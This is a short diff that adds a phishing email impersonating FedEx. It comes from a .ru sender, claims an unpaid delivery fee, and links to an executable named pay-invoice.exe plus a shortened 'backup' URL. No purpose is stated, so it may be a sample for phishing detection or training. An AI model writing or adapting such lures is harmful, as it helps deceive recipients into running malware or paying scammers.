@@ -1,0 +1,11 @@
+From: FedEx Delivery <tracking@parcel-status-update.ru>
+Subject: Your package is waiting
+
+Your delivery could not be completed because of a small unpaid fee.
+Please go here and pay to release the package:
+
+  http://192.168.12.3:8080/pay-invoice.exe
+
+If you have problems use the backup link:
+
+  https://tinyurl.com/x7f2k
